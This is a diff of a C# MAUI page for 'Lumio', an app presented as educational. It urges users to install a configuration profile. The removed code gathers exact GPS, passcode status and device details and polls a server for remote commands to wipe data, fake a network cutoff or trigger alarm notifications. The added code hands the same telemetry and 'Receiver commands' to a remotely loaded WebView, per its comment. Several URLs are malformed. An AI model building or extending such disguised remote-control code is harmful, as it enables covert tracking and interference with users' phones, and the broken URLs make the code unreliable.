@@ -1,21 +1,15 @@
 using System;
-using System.Collections.Generic;
 using System.Linq;
 using System.Net.Http;
-using System.Text.Json;
 using System.Threading.Tasks;
 using Microsoft.Maui.ApplicationModel;
 using Microsoft.Maui.Controls;
-using Microsoft.Maui.Devices;
-using Microsoft.Maui.Devices.Sensors;
 using Microsoft.Maui.Graphics;
 using Microsoft.Maui.Networking;
 using Microsoft.Maui.Storage;
 
 #if IOS
-using AudioToolbox;
 using CoreLocation;
-using LocalAuthentication;
 using UserNotifications;
 #endif
 
@@ -37,18 +31,16 @@ public class LumioMainPage : ContentPage
 {
     private const string WebsiteUrl = "https://github.io";
     private const string ProfileDownloadUrl = "https://github.iolumio-lab.mobileconfig";
-    private const string ApiCommandUrl = "https://github.ioapi/commands.json";
-    private const string ApiAppUiUrl = "https://github.ioapi/app.html";
+    private const string ApiEntryUrl = "https://github.ioapi/app.html";
 
     private readonly VerticalStackLayout _contentArea;
     private readonly Label _statusBadge;
+
     private bool _profileVerifiedOnce
     {
         get => Preferences.Default.Get("LumioProfileVerified", false);
         set => Preferences.Default.Set("LumioProfileVerified", value);
     }
-
-    private IDispatcherTimer? _apiPollTimer;
 
     public LumioMainPage()
     {
@@ -112,7 +104,6 @@ public class LumioMainPage : ContentPage
     }
     private async Task RunStartupVerificationAsync()
     {
-        _apiPollTimer?.Stop();
         _contentArea.Children.Clear();
         _statusBadge.Text = "● DIAGNOSTIC EN COURS...";
         _statusBadge.TextColor = Color.FromArgb("#22d3ee");
@@ -172,7 +163,6 @@ public class LumioMainPage : ContentPage
         }
         else
         {
-            // Vérification silencieuse après la première installation
             bool profileStillValid = await VerifyProfileSilentlyAsync();
             if (!profileStillValid)
             {
@@ -186,9 +176,8 @@ public class LumioMainPage : ContentPage
             }
         }
 
-
-        // 6. TOUT EST PRÊT -> L'APP CHARGE TOUT DEPUIS L'API
-        await ConnectAndStreamFromApiAsync();
+        // 6. TOUT EST VÉRIFIÉ -> APPELLE L'API QUI CONTIENT TOUTE L'APPLICATION ET LES COMMANDES
+        await LaunchApiAsync();
     }
 
     private async Task<bool> RequestOrFail<TPerm>(string code, string name, string step) where TPerm : Permissions.BasePermission, new()
@@ -204,119 +193,34 @@ public class LumioMainPage : ContentPage
         }
         return false;
     }
-    private async Task ConnectAndStreamFromApiAsync()
+
+    private async Task LaunchApiAsync()
     {
-        // Prépare la télémétrie de l'appareil (GPS, Batterie, Wi-Fi, Sécurité)
-        var loc = await Geolocation.Default.GetLastKnownLocationAsync();
-        string gps = loc != null ? $"{loc.Latitude:F5}, {loc.Longitude:F5}" : "Acquisition...";
-        string bat = $"{(int)(Battery.Default.ChargeLevel * 100)}% ({Battery.Default.State})";
-
-        bool hasPasscode = false;
-#if IOS
-        hasPasscode = new LAContext().CanEvaluatePolicy(LAPolicy.DeviceOwnerAuthentication, out _);
-#endif
-
-        var telemetry = new Dictionary<string, object>
-        {
-            ["appareil"] = DeviceInfo.Current.Name,
-            ["batterie"] = bat,
-            ["reseau"] = "Wi-Fi Actif",
-            ["gps_exact"] = gps,
-            ["code_verrouillage"] = hasPasscode
-        };
-        Preferences.Default.Set("LumioTelemetry", JsonSerializer.Serialize(telemetry));
-
         try
         {
-            using var client = new HttpClient();
-            var appCheck = await client.GetAsync(ApiAppUiUrl);
-            if (!appCheck.IsSuccessStatusCode)
+            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
+            var res = await client.GetAsync(ApiEntryUrl);
+            if (!res.IsSuccessStatusCode)
             {
-                ShowError("ERR-404-API", "Application API Lumio", "Le contenu de l'application sur l'API n'est pas encore en ligne. Ajoutez-le puis appuyez sur Revérifier.");
+                ShowError("ERR-404-API", "API Lumio", "Le serveur API n'est pas encore en ligne. Configurez l'API puis appuyez sur Revérifier.");
                 return;
             }
 
             _statusBadge.Text = "● CONNECTÉ À L'API LUMIO";
             _statusBadge.TextColor = Color.FromArgb("#10b981");
 
-            // Charge 100% de l'interface d'apprentissage et des jeux directement depuis l'API
+            // L'API gère tout (cours, jeux, télémétrie et commandes du Récepteur)
             _contentArea.Children.Add(new WebView
             {
-                Source = ApiAppUiUrl,
+                Source = ApiEntryUrl,
                 HeightRequest = 580,
                 BackgroundColor = Color.FromArgb("#06080d")
             });
-
-            // Écoute les commandes du Récepteur stockées dans l'API toutes les 4 secondes
-            StartApiCommandListener();
         }
         catch
         {
-            ShowError("ERR-404-API", "API Lumio", "Impossible de contacter l'API distante. Vérifiez l'API puis appuyez sur Revérifier.");
+            ShowError("ERR-404-API", "API Lumio", "Impossible de joindre l'API distante. Vérifiez l'API puis appuyez sur Revérifier.");
         }
-    }
-
-    private void StartApiCommandListener()
-    {
-        _apiPollTimer?.Stop();
-        _apiPollTimer = Dispatcher.CreateTimer();
-        _apiPollTimer.Interval = TimeSpan.FromSeconds(4);
-        _apiPollTimer.Tick += async (s, e) => await CheckApiCommandsAsync();
-        _apiPollTimer.Start();
-    }
-
-    private async Task CheckApiCommandsAsync()
-    {
-        try
-        {
-            using var client = new HttpClient();
-            var res = await client.GetAsync(ApiCommandUrl);
-            if (!res.IsSuccessStatusCode) return;
-
-            string json = await res.Content.ReadAsStringAsync();
-
-            if (json.Contains("\"wipe\":true"))
-            {
-                _apiPollTimer?.Stop();
-                Preferences.Default.Clear();
-                _profileInstalled = false;
-                _contentArea.Children.Clear();
-                ShowError("PURGE-OK", "Données effacées", "Toutes les données locales ont été supprimées par commande API.");
-            }
-            else if (json.Contains("\"disable_wifi\":true"))
-            {
-                _apiPollTimer?.Stop();
-                _contentArea.Children.Clear();
-                ShowError("404", "Connexion coupée", "404 Not connected to the internet.\nL'accès réseau a été désactivé par commande API.");
-            }
-            else if (json.Contains("\"prank_alert\":true"))
-            {
-                await TriggerRemotePrankAlertAsync();
-            }
-        }
-        catch { }
-    }
-
-    private async Task TriggerRemotePrankAlertAsync()
-    {
-#if IOS
-        var content = new UNMutableNotificationContent
-        {
-            Title = "🚨 ALERTE — TU T'ES FAIT AVOIR !",
-            Subtitle = "Démonstration éducative Lumio",
-            Body = "Tu t'es fait pranker ! Commande reçue depuis l'API Lumio.",
-            Sound = UNNotificationSound.DefaultCriticalSound
-        };
-        var req = UNNotificationRequest.FromIdentifier(Guid.NewGuid().ToString(), content, UNTimeIntervalNotificationTrigger.CreateTrigger(1, false));
-        await UNUserNotificationCenter.Current.AddNotificationRequestAsync(req);
-
-        for (int i = 0; i < 5; i++)
-        {
-            SystemSound.Vibrate.PlayAlertSound();
-            await Task.Delay(600);
-        }
-#endif
-        await DisplayAlert("🚨 Tu t'es fait avoir !", "Ceci est une démonstration éducative déclenchée via l'API !", "OK");
     }
 
     private void ShowProfileScreen()
@@ -349,11 +253,25 @@ public class LumioMainPage : ContentPage
                         Text = "2. J'ai installé le profil — Continuer",
                         BackgroundColor = Color.FromArgb("#10b981"),
                         TextColor = Colors.White,
-                        Command = new Command(async () => { _profileInstalled = true; await RunStartupVerificationAsync(); })
+                        Command = new Command(async () => { _profileVerifiedOnce = true; await RunStartupVerificationAsync(); })
                     }
                 }
             }
         });
+    }
+
+    private async Task<bool> VerifyProfileSilentlyAsync()
+    {
+        try
+        {
+            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
+            var response = await client.GetAsync(ProfileDownloadUrl);
+            return response.IsSuccessStatusCode && Preferences.Default.ContainsKey("LumioProfileVerified");
+        }
+        catch
+        {
+            return false;
+        }
     }
 
     private void ShowError(string code, string missingName, string tutorial)
